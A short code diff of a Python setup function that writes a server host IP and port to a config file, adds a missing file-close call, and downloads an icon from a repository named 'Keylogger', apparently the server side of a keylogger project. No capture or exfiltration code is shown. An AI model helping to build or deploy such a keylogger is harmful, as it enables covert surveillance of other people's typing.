@@ -23,6 +23,7 @@ def setupserver():
    IP = str(IP_ent.get())
    CN = open("./connections.py", "x")
    CN.write(f"HOST_IP = {IP}\nHOST_PORT = {PORT}")
+   CN.close()
 
    SI = open("./Server.ico", "wb")
    output = requests.get("https://raw.githubusercontent.com/etheboi/Keylogger/main/Server.ico", allow_redirects=True)
